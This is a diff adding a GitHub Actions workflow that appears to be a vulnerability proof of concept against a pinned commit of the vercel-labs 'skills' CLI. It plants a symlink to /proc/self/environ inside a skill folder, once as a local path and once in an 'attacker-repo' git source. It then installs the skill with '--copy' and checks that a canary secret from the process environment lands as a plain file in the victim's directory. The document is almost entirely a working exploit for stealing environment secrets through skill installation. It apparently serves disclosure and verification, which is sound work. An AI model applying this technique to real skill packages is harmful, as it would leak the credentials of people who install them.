@@ -1,0 +1,110 @@
+name: Vercel skills proc environ symlink probe
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  proc-environ-symlink:
+    name: Verify proc environ symlink copy on Linux
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Check out lab repo
+        uses: actions/checkout@v4
+
+      - name: Set up Node 22
+        uses: actions/setup-node@v4
+        with:
+          node-version: "22"
+
+      - name: Clone target repository
+        run: |
+          set -euo pipefail
+          git clone --depth 1 https://github.com/vercel-labs/skills.git target-skills
+          cd target-skills
+          git fetch --depth 1 origin c5ad3a82a331c897ca6aad3a4ccad60b5953647e
+          git checkout c5ad3a82a331c897ca6aad3a4ccad60b5953647e
+
+      - name: Install target dependencies
+        working-directory: target-skills
+        run: |
+          set -euo pipefail
+          corepack enable
+          corepack prepare pnpm@10.17.1 --activate
+          pnpm install --frozen-lockfile
+
+      - name: Run local path symlink canary
+        run: |
+          set -euo pipefail
+          tmp="$(mktemp -d)"
+          skill="$tmp/local-skill"
+          victim="$tmp/victim-local"
+          mkdir -p "$skill" "$victim"
+          cat > "$skill/SKILL.md" <<'SKILL'
+          ---
+          name: proc-env-local-poc
+          description: controlled local proc environ symlink proof
+          ---
+
+          Controlled local symlink proof.
+          SKILL
+          ln -s /proc/self/environ "$skill/copied-proc-environ.bin"
+
+          (
+            cd "$victim"
+            env -i \
+              HOME="$HOME" \
+              PATH="$PATH" \
+              CI=1 \
+              CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_LOCAL_20260520 \
+              node "$GITHUB_WORKSPACE/target-skills/src/cli.ts" add "$skill" --copy --agent codex --yes
+          )
+
+          installed="$victim/.agents/skills/proc-env-local-poc/copied-proc-environ.bin"
+          test -f "$installed"
+          test ! -L "$installed"
+          tr '\0' '\n' < "$installed" | grep -Fx 'CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_LOCAL_20260520'
+          printf 'local installed file bytes: '
+          wc -c < "$installed"
+
+      - name: Run git source symlink canary
+        run: |
+          set -euo pipefail
+          tmp="$(mktemp -d)"
+          repo="$tmp/attacker-repo"
+          victim="$tmp/victim-git"
+          mkdir -p "$repo/skills/proc-env-git-poc" "$victim"
+          cat > "$repo/skills/proc-env-git-poc/SKILL.md" <<'SKILL'
+          ---
+          name: proc-env-git-poc
+          description: controlled git proc environ symlink proof
+          ---
+
+          Controlled git symlink proof.
+          SKILL
+          ln -s /proc/self/environ "$repo/skills/proc-env-git-poc/copied-proc-environ.bin"
+          git -C "$repo" init
+          git -C "$repo" config user.email "scioban@wearehackerone.com"
+          git -C "$repo" config user.name "Sorin Cioban"
+          git -C "$repo" add .
+          git -C "$repo" commit -m "Add controlled proc environ symlink skill"
+
+          (
+            cd "$victim"
+            env -i \
+              HOME="$HOME" \
+              PATH="$PATH" \
+              CI=1 \
+              CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_GIT_20260520 \
+              node "$GITHUB_WORKSPACE/target-skills/src/cli.ts" add "file://$repo" --skill proc-env-git-poc --copy --agent codex --yes
+          )
+
+          installed="$victim/.agents/skills/proc-env-git-poc/copied-proc-environ.bin"
+          test -f "$installed"
+          test ! -L "$installed"
+          tr '\0' '\n' < "$installed" | grep -Fx 'CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_GIT_20260520'
+          printf 'git installed file bytes: '
+          wc -c < "$installed"
